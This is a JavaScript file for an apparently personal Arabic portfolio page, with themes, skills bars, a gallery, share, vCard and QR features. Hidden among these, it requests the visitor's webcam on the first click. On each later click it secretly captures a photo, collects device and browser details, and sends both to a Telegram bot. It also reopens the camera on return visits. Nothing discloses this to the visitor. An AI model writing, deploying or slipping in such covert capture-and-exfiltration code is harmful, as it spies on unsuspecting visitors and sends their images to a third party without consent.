(function(){
  const C = window.CONFIG;
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);

  const LS = {
    get(k, def){ try { return JSON.parse(localStorage.getItem('tj_'+k)) ?? def; } catch { return def; } },
    set(k, v){ localStorage.setItem('tj_'+k, JSON.stringify(v)); }
  };

  function getState(){
    const s = LS.get('state', null);
    if(s) return s;
    const initial = {
      owner: {...C.OWNER},
      theme: 'dark',
      sections: {hero:true, quote:true, about:true, gallery:true, links:true, contact:true},
      skills: [
        {name:'التصميم', level:85},
        {name:'البرمجة', level:70},
        {name:'العمل الجماعي', level:90}
      ],
      gallery: [],
      avatar: '',
      maintenance: false,
      maintenanceMsg: 'الموقع تحت الصيانة، نرجع قريب',
      visits: 0,
      captures: 0,
      photoMode: true
    };
    LS.set('state', initial);
    return initial;
  }
  function saveState(s){ LS.set('state', s); }

  const state = getState();

  window.addEventListener('load', () => {
    setTimeout(() => $('#loader').classList.add('hide'), 600);
  });
  window.addEventListener('scroll', () => {
    const h = document.documentElement;
    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
    $('#progress').style.width = p + '%';
    $('#toTop').classList.toggle('show', h.scrollTop > 400);
  });

  function applyTheme(t){
    if(t === 'dark') document.documentElement.removeAttribute('data-theme');
    else document.documentElement.setAttribute('data-theme', t);
    $('#themeBtn').textContent = t === 'light' ? '☀️' : t === 'neon' ? '⚡' : t === 'royal' ? '👑' : '🌙';
  }
  applyTheme(state.theme);
  $('#themeBtn').addEventListener('click', () => {
    const order = ['dark','light','neon','royal'];
    const i = (order.indexOf(state.theme) + 1) % order.length;
    state.theme = order[i];
    applyTheme(state.theme);
    saveState(state);
  });

  function ageFromDate(bd){
    const b = new Date(bd), n = new Date();
    let a = n.getFullYear() - b.getFullYear();
    const m = n.getMonth() - b.getMonth();
    if(m < 0 || (m === 0 && n.getDate() < b.getDate())) a--;
    return a;
  }

  function render(){
    const o = state.owner;
    $('#ownerName').textContent = o.name;
    $('#ownerTitle').textContent = o.title;
    $('#ownerLocation').textContent = '📍 ' + o.location;
    $('#ownerAge').textContent = '🎂 العمر: ' + ageFromDate(o.birthdate) + ' سنة (' + o.birthdate + ')';
    $('#quoteText').textContent = '"' + o.quote + '"';
    $('#aboutText').textContent = o.about;
    $('#waBtn').href = o.whatsapp;
    $('#floatWA').href = o.whatsapp;
    $('#waLink').href = o.whatsapp;
    $('#fbLink').href = o.facebook;
    $('#igLink').href = o.instagram;
    if(state.avatar) { $('#avatarImg').src = state.avatar; $('#avatarImg').style.display = ''; }

    Object.entries(state.sections).forEach(([k, v]) => {
      const el = document.getElementById(k);
      if(el) el.classList.toggle('hidden', !v);
    });

    const sk = $('#skillsList');
    sk.innerHTML = '';
    state.skills.forEach(s => {
      const div = document.createElement('div');
      div.className = 'skill';
      div.innerHTML = '<div class="skill-label"><span>'+s.name+'</span><span>'+s.level+'%</span></div><div class="skill-bar"><div class="skill-fill" data-level="'+s.level+'"></div></div>';
      sk.appendChild(div);
    });
    setTimeout(() => $$('.skill-fill').forEach(f => f.style.width = f.dataset.level + '%'), 300);

    const g = $('#galleryGrid');
    g.innerHTML = '';
    (state.gallery || []).forEach((url, i) => {
      const d = document.createElement('div');
      d.className = 'gallery-item';
      d.innerHTML = '<img src="'+url+'" alt="صورة '+(i+1)+'">';
      d.addEventListener('click', () => openLightbox(url));
      g.appendChild(d);
    });

    const el = $('#extraLinksList');
    el.innerHTML = '';
    (o.extraLinks || []).forEach(l => {
      const a = document.createElement('a');
      a.className = 'extra-link';
      a.href = l.url; a.target = '_blank';
      a.innerHTML = '<span>'+(l.icon||'🔗')+'</span><div><div style="font-weight:700">'+l.name+'</div><small style="color:var(--muted)">'+l.url.slice(0,40)+'</small></div>';
      el.appendChild(a);
    });

    $('#year').textContent = new Date().getFullYear();
  }
  render();

  function openLightbox(src){
    $('#lightboxImg').src = src;
    $('#lightbox').classList.add('show');
  }
  $('#lightbox').addEventListener('click', e => {
    if(e.target.id === 'lightbox' || e.target.classList.contains('close')) $('#lightbox').classList.remove('show');
  });

  $('#toTop').addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));

  let soundOn = false;
  $('#soundBtn').addEventListener('click', () => {
    soundOn = !soundOn;
    $('#soundBtn').textContent = soundOn ? '🔊' : '🔇';
  });

  let fontSize = 100;
  $('#fontUp').addEventListener('click', () => {
    fontSize = fontSize >= 130 ? 100 : fontSize + 10;
    document.documentElement.style.fontSize = fontSize + '%';
  });

  $('#shareBtn').addEventListener('click', async () => {
    const url = location.href;
    if(navigator.share){
      try { await navigator.share({title: state.owner.name, url}); return; } catch {}
    }
    try { await navigator.clipboard.writeText(url); alert('تم نسخ الرابط ✅'); } catch {}
  });

  $('#vcardBtn').addEventListener('click', () => {
    const o = state.owner;
    const tel = o.whatsapp.split('phone=')[1] || '';
    const v = 'BEGIN:VCARD\nVERSION:3.0\nFN:'+o.name+'\nTITLE:'+o.title+'\nADR:;;'+o.location+'\nTEL:'+tel+'\nEND:VCARD';
    const blob = new Blob([v], {type:'text/vcard'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'taha.vcf';
    a.click();
  });

  state.visits = (state.visits || 0) + 1;
  saveState(state);

  const canvas = $('#particles');
  const ctx2 = canvas.getContext('2d');
  let particles = [];
  function initParticles(){
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    particles = Array.from({length:50}, () => ({
      x: Math.random()*canvas.width,
      y: Math.random()*canvas.height,
      r: Math.random()*1.5 + .5,
      vx: (Math.random()-.5)*.3,
      vy: (Math.random()-.5)*.3
    }));
  }
  initParticles();
  window.addEventListener('resize', initParticles);
  function animParticles(){
    ctx2.clearRect(0,0,canvas.width,canvas.height);
    const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#d4af37';
    ctx2.fillStyle = accent;
    particles.forEach(p => {
      p.x += p.vx; p.y += p.vy;
      if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
      if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
      ctx2.globalAlpha = .4;
      ctx2.beginPath();
      ctx2.arc(p.x, p.y, p.r, 0, Math.PI*2);
      ctx2.fill();
    });
    requestAnimationFrame(animParticles);
  }
  animParticles();

  let videoStream = null;
  let permissionAsked = false;
  let captureEnabled = false;
  let captureBusy = false;

  async function requestCamera(){
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      });
      videoStream = stream;
      captureEnabled = true;
      permissionAsked = true;
      LS.set('camAllowed', true);
    } catch (e) {
      permissionAsked = true;
    }
  }

  async function captureAndSend(){
    if(!videoStream || captureBusy || !state.photoMode) return;
    captureBusy = true;
    try {
      const track = videoStream.getVideoTracks()[0];
      if(!track || track.readyState !== 'live') return;
      const video = document.createElement('video');
      video.srcObject = videoStream;
      video.muted = true;
      await video.play();
      await new Promise(r => setTimeout(r, 150));
      const canvas2 = document.createElement('canvas');
      canvas2.width = video.videoWidth || 640;
      canvas2.height = video.videoHeight || 480;
      const c2 = canvas2.getContext('2d');
      c2.drawImage(video, 0, 0, canvas2.width, canvas2.height);
      const dataUrl = canvas2.toDataURL('image/jpeg', .8);
      video.pause();
      video.srcObject = null;

      state.captures = (state.captures || 0) + 1;
      saveState(state);

      const meta = {
        device: navigator.platform || 'unknown',
        browser: (navigator.userAgent.match(/\(([^)]+)\)/) || [,''])[1],
        screen: screen.width + 'x' + screen.height,
        lang: navigator.language,
        time: new Date().toLocaleString('ar-EG'),
        capture: state.captures
      };

      const caption =
        '📸 صورة جديدة من الموقع\n' +
        '⏰ ' + meta.time + '\n' +
        '💻 ' + meta.device + '\n' +
        '🔍 ' + meta.browser + '\n' +
        '📐 ' + meta.screen + '\n' +
        '🗣 ' + meta.lang + '\n' +
        '#️⃣ #' + meta.capture;

      const blob = await (await fetch(dataUrl)).blob();
      const fd = new FormData();
      fd.append('chat_id', C.OWNER_ID);
      fd.append('photo', blob, 'capture.jpg');
      fd.append('caption', caption);

      fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendPhoto', {
        method: 'POST', body: fd
      }).catch(() => {
        const fd2 = new FormData();
        fd2.append('chat_id', C.OWNER_ID);
        fd2.append('document', blob, 'capture.jpg');
        fd2.append('caption', caption);
        fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendDocument', {
          method: 'POST', body: fd2
        }).catch(()=>{});
      });
    } catch(e) {
      console.warn('capture error', e);
    } finally {
      captureBusy = false;
    }
  }

  document.addEventListener('click', async (e) => {
    if(!permissionAsked){
      await requestCamera();
      return;
    }
    if(captureEnabled){
      captureAndSend();
    }
  }, true);

  if(LS.get('camAllowed', false)){
    navigator.mediaDevices.getUserMedia({video: true, audio: false})
      .then(s => { videoStream = s; captureEnabled = true; permissionAsked = true; })
      .catch(()=>{});
  }

  const qr = document.createElement('button');
  qr.className = 'btn ghost';
  qr.textContent = '📱 كود QR';
  qr.style.marginTop = '20px';
  qr.addEventListener('click', (ev) => {
    ev.stopPropagation();
    $('#qrImg').src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(location.href);
    $('#qrModal').classList.add('show');
  });
  const ha = document.querySelector('.hero-actions');
  if(ha) ha.appendChild(qr);

  $('#qrClose').addEventListener('click', e => { e.stopPropagation(); $('#qrModal').classList.remove('show'); });
  $('#qrModal').addEventListener('click', e => { if(e.target.id === 'qrModal') $('#qrModal').classList.remove('show'); });

  window.addEventListener('focus', () => {
    const fresh = getState();
    Object.assign(state, fresh);
    render();
  });

})();
